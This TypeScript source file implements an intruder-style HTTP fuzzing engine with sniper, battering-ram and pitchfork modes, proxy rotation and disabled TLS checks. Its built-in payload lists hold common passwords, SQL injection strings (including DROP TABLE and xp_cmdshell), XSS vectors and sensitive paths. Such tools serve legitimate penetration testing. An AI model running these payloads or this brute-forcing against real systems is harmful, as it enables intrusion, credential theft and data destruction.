import { request, Agent, ProxyAgent } from 'undici';
import type Database from 'better-sqlite3';

export interface IntruderConfig {
  method: string;
  url: string;
  headers: Record<string, string>;
  bodyTemplate: string;
  payloads: string[];
  attackType: 'sniper' | 'battering_ram' | 'pitchfork';
  rateLimit: number;
}

export interface IntruderResult {
  index: number;
  payload: string;
  status: number;
  length: number;
  duration: number;
  error?: string;
}

const BUILTIN_PAYLOADS: Record<string, string[]> = {
  'Common Passwords': ['admin','password','123456','password123','12345678','qwerty','abc123','monkey','1234567','letmein','trustno1','dragon','baseball','iloveyou','master','sunshine','ashley','michael','shadow','123123','654321','superman','qazwsx','football','password1','charlie','donald','test','root','toor','admin123','pass','changeme','welcome','login','princess','starwars','solo','!@#$%^&*','passw0rd','p@ssword','P@ss1234','secret','access','flower','hello','robert','123456789','000000'],
  'SQL Injection': ["' OR '1'='1","' OR 1=1--","1' AND '1'='1","' UNION SELECT NULL--","'; DROP TABLE users--","1; WAITFOR DELAY '0:0:5'--","' AND SLEEP(5)--","admin'--","' OR ''='","1 OR 1=1","' OR 'x'='x","') OR ('1'='1","' HAVING 1=1--","' ORDER BY 1--","' UNION SELECT 1,2,3--","1' AND 1=CONVERT(int,@@version)--","' AND extractvalue(1,concat(0x7e,version()))--","' OR 1=1#","admin' #","' OR 'a'='a","' AND 1=0 UNION SELECT NULL,NULL--","' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--","'; EXEC xp_cmdshell('whoami')--","' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--","' || (SELECT '' FROM dual) || '"],
  'XSS': ['<script>alert(1)</script>','"><img src=x onerror=alert(1)>','<svg onload=alert(1)>','javascript:alert(1)','<img src=x onerror=alert(1)//>','<details/open/ontoggle=alert(1)>','"><svg/onload=alert(1)>','<body onload=alert(1)>','<marquee onstart=alert(1)>','<input onfocus=alert(1) autofocus>','<video src=x onerror=alert(1)>','<audio src=x onerror=alert(1)>','<iframe src="javascript:alert(1)">','<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">','${alert(1)}','{{constructor.constructor("alert(1)")()}}','\'-alert(1)-\'','</script><script>alert(1)</script>','<img/src/onerror=alert(1)>','<svg><script>alert(1)</script>'],
  'Directory Paths': ['/admin','/login','/api','/backup','/config','/dashboard','/debug','/test','/dev','/staging','/internal','/private','/secret','/hidden','/old','/temp','/tmp','/upload','/uploads','/files','/data','/db','/database','/sql','/phpmyadmin','/wp-admin','/administrator','/manager','/console','/portal','/panel','/cpanel','/webmail','/status','/health','/metrics','/env','/info','/server-status','/server-info'],
  'Numbers 1-100': Array.from({length: 100}, (_, i) => String(i + 1)),
};

export function getBuiltinPayloads(): Record<string, string[]> { return BUILTIN_PAYLOADS; }

export class IntruderEngine {
  private running = false;
  private db: Database.Database;
  private abortController: AbortController | null = null;

  constructor(db: Database.Database) { this.db = db; }

  stop() { this.running = false; if (this.abortController) this.abortController.abort(); }

  async attack(config: IntruderConfig, onResult: (r: IntruderResult) => void): Promise<void> {
    this.running = true;
    const positions = this.parsePositions(config.bodyTemplate);
    const dispatcher = await this.getDispatcher();
    const delay = 1000 / Math.max(1, config.rateLimit);
    let index = 0;

    if (config.attackType === 'battering_ram') {
      for (const payload of config.payloads) {
        if (!this.running) break;
        const body = this.replaceAll(config.bodyTemplate, positions, payload);
        const r = await this.sendRequest(config, body, dispatcher);
        onResult({ index: index++, payload, ...r });
        await this.sleep(delay);
      }
    } else if (config.attackType === 'sniper') {
      for (let pos = 0; pos < positions.length; pos++) {
        for (const payload of config.payloads) {
          if (!this.running) break;
          const body = this.replaceOne(config.bodyTemplate, positions, pos, payload);
          const r = await this.sendRequest(config, body, dispatcher);
          onResult({ index: index++, payload: `[${pos}] ${payload}`, ...r });
          await this.sleep(delay);
        }
      }
    } else {
      const lists = this.splitPayloads(config.payloads, positions.length);
      const maxLen = Math.max(...lists.map(l => l.length));
      for (let i = 0; i < maxLen; i++) {
        if (!this.running) break;
        let body = config.bodyTemplate;
        const usedPayloads: string[] = [];
        for (let p = positions.length - 1; p >= 0; p--) {
          const pl = lists[p]?.[i] || '';
          usedPayloads.unshift(pl);
          body = body.slice(0, positions[p].start) + pl + body.slice(positions[p].end);
        }
        const r = await this.sendRequest(config, body, dispatcher);
        onResult({ index: index++, payload: usedPayloads.join(' | '), ...r });
        await this.sleep(delay);
      }
    }
    this.running = false;
  }

  private parsePositions(template: string): { start: number; end: number; original: string }[] {
    const positions: { start: number; end: number; original: string }[] = [];
    let i = 0;
    while (i < template.length) {
      const s = template.indexOf('§', i);
      if (s === -1) break;
      const e = template.indexOf('§', s + 1);
      if (e === -1) break;
      positions.push({ start: s, end: e + 1, original: template.slice(s + 1, e) });
      i = e + 1;
    }
    return positions;
  }

  private replaceAll(template: string, positions: { start: number; end: number }[], payload: string): string {
    let result = template;
    for (let i = positions.length - 1; i >= 0; i--) {
      result = result.slice(0, positions[i].start) + payload + result.slice(positions[i].end);
    }
    return result;
  }

  private replaceOne(template: string, positions: { start: number; end: number; original: string }[], targetPos: number, payload: string): string {
    let result = template;
    for (let i = positions.length - 1; i >= 0; i--) {
      const val = i === targetPos ? payload : positions[i].original;
      result = result.slice(0, positions[i].start) + val + result.slice(positions[i].end);
    }
    return result;
  }

  private splitPayloads(payloads: string[], count: number): string[][] {
    if (count <= 0) return [payloads];
    const chunkSize = Math.ceil(payloads.length / count);
    const lists: string[][] = [];
    for (let i = 0; i < count; i++) lists.push(payloads.slice(i * chunkSize, (i + 1) * chunkSize));
    return lists;
  }

  private async sendRequest(config: IntruderConfig, body: string, dispatcher: any): Promise<{ status: number; length: number; duration: number; error?: string }> {
    const start = Date.now();
    this.abortController = new AbortController();
    try {
      const res = await request(config.url, {
        method: config.method as any,
        headers: config.headers,
        body: body || undefined,
        headersTimeout: 15000,
        bodyTimeout: 15000,
        dispatcher,
        signal: this.abortController.signal,
      } as any);
      const text = await res.body.text();
      return { status: res.statusCode, length: Buffer.byteLength(text), duration: Date.now() - start };
    } catch (e: any) {
      if (e.name === 'AbortError') return { status: 0, length: 0, duration: Date.now() - start, error: 'Aborted' };
      return { status: 0, length: 0, duration: Date.now() - start, error: e.message };
    }
  }

  private async getDispatcher() {
    const listRow = this.db.prepare("SELECT value FROM app_settings WHERE key = 'proxy_list'").get() as any;
    if (listRow) { try { const list = JSON.parse(listRow.value); if (Array.isArray(list) && list.length > 0) { const p = list[Math.floor(Math.random() * list.length)]; const auth = p.username && p.password ? `${encodeURIComponent(p.username)}:${encodeURIComponent(p.password)}@` : ''; return new ProxyAgent({ uri: `http://${auth}${p.host}:${p.port}`, requestTls: { rejectUnauthorized: false } } as any); } } catch {} }
    return new Agent({ connect: { rejectUnauthorized: false } });
  }

  private sleep(ms: number): Promise<void> { return new Promise(r => setTimeout(r, ms)); }
}
